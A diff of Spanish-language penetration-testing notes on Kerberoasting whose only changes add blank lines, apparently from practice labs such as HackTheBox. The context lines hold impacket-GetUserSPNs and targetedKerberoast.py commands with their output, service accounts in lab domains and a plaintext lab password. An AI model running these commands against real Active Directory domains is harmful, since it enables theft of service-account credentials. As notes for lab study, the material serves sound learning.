@@ -18,6 +18,7 @@
 - `impacket-GetUserSPNs -dc-ip IP DOMAIN.LOCAL/USER`
 - `impacket-GetUserSPNs -request -dc-ip 172.16.139.3 -target-domain trilocor.local trilocor.local/pthorpe`
 - Ejemplo:
+
 ```powershell
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
 
@@ -30,6 +31,7 @@ MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Account
 MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
 MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
 adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never> 
+
 ```
 
 #### Chequear cuenta post crackeo
@@ -52,6 +54,7 @@ adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLeg
 - sudo ntpdate 10.10.11.42
 
 ```                                                                                                                                                          
+
 ┌──(kali㉿kali)-[~/targetedKerberoast]
 └─$ python3 targetedKerberoast.py -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -d Administrator.htb --dc-ip 10.10.11.42
 [*] Starting kerberoast attacks
